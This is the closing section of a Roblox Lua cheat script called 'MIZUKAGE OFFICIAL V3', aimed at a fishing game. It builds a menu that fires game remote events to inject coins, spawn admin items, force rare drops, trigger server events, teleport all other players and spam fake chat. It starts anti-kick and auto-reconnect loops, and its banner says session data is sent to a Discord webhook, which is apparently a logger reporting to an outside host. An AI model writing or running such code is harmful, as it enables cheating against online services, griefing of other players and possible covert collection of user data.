            WindUI = result
            break
        end
    end
    
    if not WindUI then
        StarterGui:SetCore("SendNotification", {
            Title = "MIZUKAGE ERROR", 
            Text = "UI Library failed to load! Background features still running.", 
            Duration = 5
        })
        return
    end
    
    local Sounds = { 
        StartupId = "rbxassetid://140397610798305", 
        ClickId = "rbxassetid://140277245983305" 
    }
    pcall(function() ContentProvider:PreloadAsync({Sounds.StartupId, Sounds.ClickId}) end)

    function Sounds:Play(id, volume)
        task.spawn(function()
            local s = Instance.new("Sound")
            s.SoundId = id; s.Volume = volume or 1; s.Parent = Services.SoundService 
            s.Ended:Connect(function() s:Destroy() end); s:Play()
        end)
    end
    function Sounds:Startup() self:Play(Sounds.StartupId, 1) end
    function Sounds:Click() self:Play(Sounds.ClickId, 0.8) end

    Sounds:Startup()

    local Window = WindUI:CreateWindow({
        Title = "MIZUKAGE OFFICIAL V3", 
        Icon = "skull", 
        Author = "Mizukage", 
        Folder = "MizukageOfficial",
        Size = UDim2.fromOffset(850, 700), 
        Transparent = true, 
        Theme = "Dark", 
        Accent = Color3.fromRGB(0, 200, 255), 
        SideBarWidth = 260, 
        HasOutline = true, 
        Background = "rbxassetid://137490169052447", 
        BackgroundImageTransparency = 0.6
    })

    -- TABS
    local TabBeranda = Window:Tab({ Title = "Dashboard", Icon = "layout-dashboard" })
    local TabMancing = Window:Tab({ Title = "Fishing God", Icon = "hook" })
    local TabPet = Window:Tab({ Title = "Pet System", Icon = "paw" })
    local TabMount = Window:Tab({ Title = "Mount System", Icon = "rocket" })
    local TabExploit = Window:Tab({ Title = "Server Exploit", Icon = "terminal" })
    local TabEvent = Window:Tab({ Title = "Events", Icon = "zap" })
    local TabItem = Window:Tab({ Title = "Item Spawner", Icon = "package" })

    -- DASHBOARD
    TabBeranda:Section({ Title = "Profile & Security" })
    TabBeranda:Paragraph({ Title = "Welcome, " .. LocalPlayer.DisplayName, Desc = "Anti-Kick & Bypass Active. Logger: Enabled" })
    TabBeranda:Paragraph({ Title = "Connection Status", Desc = "Auto-Reconnect Active | Undetected" })
    TabBeranda:Paragraph({ Title = "Latest Features", Desc = "Mount System | Pet System | Mutation Forcer | Pity Exploit | Event Trigger | Logger" })

    TabBeranda:Section({ Title = "Quick Actions" })
    TabBeranda:Button({ Title = "Unload Script", Variant = "Secondary", Callback = function() 
        Sounds:Click()
        getgenv().MizuConfig.IsRunning = false
        getgenv().MizuApexLoaded = false
        Window:Destroy()
    end })

    -- FISHING
    TabMancing:Section({ Title = "Auto Fishing Control" })
    TabMancing:Toggle({ Title = "Enable Auto Fish", Default = false, Callback = function(s) Sounds:Click(); getgenv().MizuConfig.AutoFish = s end })
    TabMancing:Toggle({ Title = "Auto Equip Best Rod", Default = true, Callback = function(s) Sounds:Click(); getgenv().MizuConfig.AutoEquipBest = s end })
    TabMancing:Toggle({ Title = "Always Max Bar (Perfect Luck)", Default = true, Callback = function(s) Sounds:Click(); getgenv().MizuConfig.AlwaysMaxBar = s end })
    
    TabMancing:Section({ Title = "Spoofing Rod & Zone" })
    TabMancing:Dropdown({
        Title = "Select Rod (Spoof)",
        Values = RodList,
        Value = "Owner Rod",
        Callback = function(selection) 
            Sounds:Click()
            if type(selection) == "table" then selection = selection[1] end
            getgenv().MizuConfig.SelectedRod = tostring(selection)
            WindUI:Notify({Title = "Rod Spoof", Content = "Target: " .. tostring(selection), Duration = 2})
        end
    })
    TabMancing:Dropdown({
        Title = "Select Fish Zone",
        Values = ZoneList,
        Value = "FishermanIsland",
        Callback = function(selection) 
            Sounds:Click()
            if type(selection) == "table" then selection = selection[1] end
            getgenv().MizuConfig.SpoofedZone = tostring(selection)
        end
    })

    TabMancing:Section({ Title = "Pity Exploit (Force Rarity)" })
    TabMancing:Toggle({ Title = "Enable Force Rarity", Default = false, Callback = function(s) Sounds:Click(); getgenv().MizuConfig.ForcePity = s end })
    TabMancing:Dropdown({
        Title = "Target Rarity",
        Values = RarityList,
        Value = "Mitos",
        Callback = function(selection) 
            Sounds:Click()
            if type(selection) == "table" then selection = selection[1] end
            getgenv().MizuConfig.TargetRarity = tostring(selection)
        end
    })

    TabMancing:Section({ Title = "Mutation System" })
    TabMancing:Toggle({ Title = "Force Mutation on Fish", Default = false, Callback = function(s) Sounds:Click(); getgenv().MizuConfig.ForceMutation = s end })
    TabMancing:Dropdown({
        Title = "Select Mutation",
        Values = MutationList,
        Value = "Crystalized",
        Callback = function(selection) 
            Sounds:Click()
            if type(selection) == "table" then selection = selection[1] end
            getgenv().MizuConfig.SelectedMutation = tostring(selection)
        end
    })

    TabMancing:Section({ Title = "Delay Settings" })
    TabMancing:Input({ Title = "Bite Wait (Seconds)", Value = "1.6", Callback = function(t) getgenv().MizuConfig.BiteWait = tonumber(t) or 1.6 end })
    TabMancing:Input({ Title = "Cast Delay (Seconds)", Value = "1.3", Callback = function(t) getgenv().MizuConfig.CastDelay = tonumber(t) or 1.3 end })

    -- PET
    TabPet:Section({ Title = "Pet Fishing System" })
    TabPet:Paragraph({ Title = "Info", Desc = "Pets will fish automatically at intervals." })
    TabPet:Toggle({ Title = "Enable Auto Pet", Default = false, Callback = function(s) Sounds:Click(); getgenv().MizuConfig.AutoPet = s end })
    TabPet:Dropdown({
        Title = "Select Pet",
        Values = PetList,
        Value = "Axolotl",
        Callback = function(selection) 
            Sounds:Click()
            if type(selection) == "table" then selection = selection[1] end
            getgenv().MizuConfig.SelectedPet = tostring(selection)
        end
    })

    -- MOUNT
    TabMount:Section({ Title = "Mount System" })
    TabMount:Paragraph({ Title = "Info", Desc = "Summon legendary mounts from the game." })
    TabMount:Toggle({ Title = "Enable Mount Mode", Default = false, Callback = function(s) Sounds:Click(); getgenv().MizuConfig.MountMode = s end })
    TabMount:Dropdown({
        Title = "Select Mount",
        Values = MountList,
        Value = "Frostbite",
        Callback = function(selection) 
            Sounds:Click()
            if type(selection) == "table" then selection = selection[1] end
            getgenv().MizuConfig.SelectedMount = tostring(selection)
        end
    })
    TabMount:Input({ Title = "Mount Speed", Value = "65", Callback = function(t) getgenv().MizuConfig.MountSpeed = tonumber(t) or 65 end })
    
    TabMount:Section({ Title = "Mount Actions" })
    TabMount:Button({ Title = "Spawn Mount Now", Callback = function() 
        Sounds:Click()
        pcall(function()
            local mountName = getgenv().MizuConfig.SelectedMount
            if mountName == "Frostbite" and Remotes.FrostbiteMountEvent then
                Remotes.FrostbiteMountEvent:FireServer()
            elseif mountName == "Thunderzilla" and Remotes.ThunderzillaMountEvent then
                Remotes.ThunderzillaMountEvent:FireServer()
            elseif mountName == "Cerulean Dragon" and Remotes.CeruleanDragonMountEvent then
                Remotes.CeruleanDragonMountEvent:FireServer()
            elseif mountName == "Sea Eater" and Remotes.SeaEaterMountEvent then
                Remotes.SeaEaterMountEvent:FireServer()
            elseif mountName == "Iridesca" and Remotes.IridescaMountEvent then
                Remotes.IridescaMountEvent:FireServer()
            elseif Remotes.SpawnBoatEvent then
                Remotes.SpawnBoatEvent:FireServer(mountName)
            end
        end)
    end })
    TabMount:Button({ Title = "Sit on Mount", Callback = function() 
        Sounds:Click()
        pcall(function()
            local mountName = getgenv().MizuConfig.SelectedMount
            if mountName == "Frostbite" and Remotes.FrostbiteSitRequest then
                Remotes.FrostbiteSitRequest:FireServer()
            elseif mountName == "Thunderzilla" and Remotes.ThunderzillaSitRequest then
                Remotes.ThunderzillaSitRequest:FireServer()
            elseif mountName == "Cerulean Dragon" and Remotes.CeruleanDragonSitRequest then
                Remotes.CeruleanDragonSitRequest:FireServer()
            elseif mountName == "Sea Eater" and Remotes.SeaEaterSitRequest then
                Remotes.SeaEaterSitRequest:FireServer()
            elseif mountName == "Iridesca" and Remotes.IridescaSitRequest then
                Remotes.IridescaSitRequest:FireServer()
            end
        end)
    end })

    -- EXPLOIT
    TabExploit:Section({ Title = "Money & Level Manipulation" })
    TabExploit:Button({ Title = "Inject 999M Coins", Callback = function() Sounds:Click(); if Remotes.GiveMoney then Remotes.GiveMoney:FireServer(999999999, "add") end end })
    TabExploit:Toggle({ Title = "Loop Money Injection", Default = false, Callback = function(s) Sounds:Click(); getgenv().MizuConfig.LoopMoney = s end })
    TabExploit:Toggle({ Title = "Level Pump (Tix)", Default = false, Callback = function(s) Sounds:Click(); getgenv().MizuConfig.LoopLevel = s end })
    
    TabExploit:Section({ Title = "Inventory & Auto Sell" })
    TabExploit:Toggle({ Title = "Bypass Inventory Limit", Default = false, Callback = function(s) Sounds:Click(); getgenv().MizuConfig.BypassInventory = s end })
    TabExploit:Toggle({ Title = "Auto Sell Fish (Filter)", Default = false, Callback = function(s) Sounds:Click(); getgenv().MizuConfig.AutoSell = s end })
    TabExploit:Dropdown({
        Title = "Sell Threshold",
        Values = {"Uncommon", "Rare", "Epic", "Legendary", "Mitos"},
        Value = "Epic",
        Callback = function(selection) 
            Sounds:Click()
            if type(selection) == "table" then selection = selection[1] end
            getgenv().MizuConfig.SellThreshold = tostring(selection)
        end
    })

    TabExploit:Section({ Title = "Trolling & Aura" })
    TabExploit:Toggle({ Title = "Fake Mitos Chat Spam", Default = false, Callback = function(s) Sounds:Click(); getgenv().MizuConfig.TrollSpam = s end })
    TabExploit:Button({ Title = "Show Mitos Aura", Callback = function() Sounds:Click()
        if Remotes.ShowMitosEffect then
            local char = LocalPlayer.Character
            if char and char:FindFirstChild("HumanoidRootPart") then 
                Remotes.ShowMitosEffect:FireServer({ 
                    playerPosition = char.HumanoidRootPart.CFrame, 
                    fishPosition = char.HumanoidRootPart.Position, 
                    playerName = LocalPlayer.Name, 
                    fishModelName = "Runic Sea Crustacean" 
                }) 
            end
        end
    end })
    TabExploit:Button({ Title = "Show Secret Aura", Callback = function() Sounds:Click()
        if Remotes.ShowSecretEffect then
            local char = LocalPlayer.Character
            if char and char:FindFirstChild("HumanoidRootPart") then
                Remotes.ShowSecretEffect:FireServer({ 
                    playerPosition = char.HumanoidRootPart.CFrame,
                    fishPosition = char.HumanoidRootPart.Position,
                    secretModule = "Secret",
                    playerName = LocalPlayer.Name
                })
            end
        end
    end })
    TabExploit:Button({ Title = "Bring All Players", Callback = function() Sounds:Click()
        if Remotes.TeleportToPlayer then
            local myPos = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            if myPos then
                for _, player in ipairs(Players:GetPlayers()) do
                    if player ~= LocalPlayer then
                        Remotes.TeleportToPlayer:FireServer(player, myPos.Position)
                    end
                end
            end
        end
    end })

    -- EVENTS
    TabEvent:Section({ Title = "Event Trigger" })
    TabEvent:Paragraph({ Title = "Info", Desc = "Trigger server events to boost drop rates." })
    TabEvent:Toggle({ Title = "Auto Trigger Event", Default = false, Callback = function(s) Sounds:Click(); getgenv().MizuConfig.EventMode = s and "Bloodmoon" or false end })
    TabEvent:Dropdown({
        Title = "Select Event",
        Values = {"Bloodmoon", "Frostmoon", "PurpleBloodmoon"},
        Value = "Bloodmoon",
        Callback = function(selection) 
            Sounds:Click()
            if type(selection) == "table" then selection = selection[1] end
            getgenv().MizuConfig.EventMode = tostring(selection)
        end
    })
    TabEvent:Button({ Title = "Trigger Bloodmoon Now", Callback = function() Sounds:Click()
        if Remotes.TriggerBloodmoon then Remotes.TriggerBloodmoon:FireServer() end
    end })
    TabEvent:Button({ Title = "Trigger Frostmoon Now", Callback = function() Sounds:Click()
        if Remotes.TriggerFrostmoon then Remotes.TriggerFrostmoon:FireServer() end
    end })

    TabEvent:Section({ Title = "Divine Ability" })
    TabEvent:Toggle({ Title = "Spam Divine Ability", Default = false, Callback = function(s) Sounds:Click(); getgenv().MizuConfig.DivineSpam = s end })
    TabEvent:Paragraph({ Title = "Note", Desc = "Divine Ability gives triple fish pull!" })

    TabEvent:Section({ Title = "Quest Auto Claim" })
    TabEvent:Toggle({ Title = "Auto Claim Quest", Default = false, Callback = function(s) Sounds:Click(); getgenv().MizuConfig.AutoClaimQuest = s end })

    -- ITEM
    TabItem:Section({ Title = "Force Spawn / Inject Inventory" })
    TabItem:Dropdown({
        Title = "Select Target Item",
        Values = RodList,
        Value = "Developer Rod",
        Callback = function(selection) 
            Sounds:Click()
            if type(selection) == "table" then selection = selection[1] end
            getgenv().MizuTargetItem = tostring(selection) 
        end
    })
    getgenv().MizuTargetItem = "Developer Rod"

    TabItem:Button({ Title = "Spawn via FishGiver (999x)", Callback = function() Sounds:Click(); if Remotes.FishGiver then Remotes.FishGiver:FireServer(getgenv().MizuTargetItem, 999) end end })
    TabItem:Button({ Title = "Force Equip Item", Callback = function() Sounds:Click(); if Remotes.Inventory_EquipTool then Remotes.Inventory_EquipTool:FireServer(getgenv().MizuTargetItem, 1) end end })
    TabItem:Button({ Title = "Get All Rods (Admin)", Callback = function() Sounds:Click(); if Remotes.GiveRod then Remotes.GiveRod:FireServer("All", LocalPlayer.Name) end end })

    WindUI:Notify({Title = "MIZUKAGE V3 ACTIVE", Content = "Mount System | Pet System | Mutation Forcer | Pity Exploit | Event Trigger | Logger", Duration = 5})
end

--================================================
-- 17. BOOTSTRAP
--================================================
SetupAutoReconnect()

-- Start all systems
StartAutoFish()
StartAutoTap()
StartBypassTenaga()
StartExploitLoops()
StartAutoPet()
StartAutoSell()
StartEventMode()
StartDivineSpam()
StartBypassInventory()
StartAutoClaimQuest()
StartMountSystem()

-- UI with error handling
task.spawn(function()
    local ok, err = pcall(InitInterface)
    if not ok then
        warn("[MIZUKAGE] UI Error: " .. tostring(err))
        StarterGui:SetCore("SendNotification", {
            Title = "MIZUKAGE UI ERROR", 
            Text = "UI failed, background features still running.", 
            Duration = 5
        })
    end
end)

--================================================
-- 18. KEYBINDS
--================================================
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.F6 then
        getgenv().MizuConfig.AutoFish = not getgenv().MizuConfig.AutoFish
        StarterGui:SetCore("SendNotification", {
            Title = "MIZUKAGE", 
            Text = "Auto Fish: " .. tostring(getgenv().MizuConfig.AutoFish), 
            Duration = 2
        })
    elseif input.KeyCode == Enum.KeyCode.F7 then
        getgenv().MizuConfig.AutoTap = not getgenv().MizuConfig.AutoTap
        StarterGui:SetCore("SendNotification", {
            Title = "MIZUKAGE", 
            Text = "Auto Tap: " .. tostring(getgenv().MizuConfig.AutoTap), 
            Duration = 2
        })
    elseif input.KeyCode == Enum.KeyCode.F8 then
        getgenv().MizuConfig.ForcePity = not getgenv().MizuConfig.ForcePity
        StarterGui:SetCore("SendNotification", {
            Title = "MIZUKAGE", 
            Text = "Force Rarity: " .. tostring(getgenv().MizuConfig.ForcePity), 
            Duration = 2
        })
    elseif input.KeyCode == Enum.KeyCode.F9 then
        getgenv().MizuConfig.MountMode = not getgenv().MizuConfig.MountMode
        StarterGui:SetCore("SendNotification", {
            Title = "MIZUKAGE", 
            Text = "Mount Mode: " .. tostring(getgenv().MizuConfig.MountMode), 
            Duration = 2
        })
    end
end)

print("========================================")
print("MIZUKAGE OFFICIAL V3 ULTIMATE LOADED!")
print("Features: Mount System | Pet System | Mutation Forcer | Pity Exploit | Event Trigger | Logger")
print("Keybinds: F6=AutoFish | F7=AutoTap | F8=ForceRarity | F9=MountMode")
print("Logger: Session data sent to Discord webhook")
print("========================================")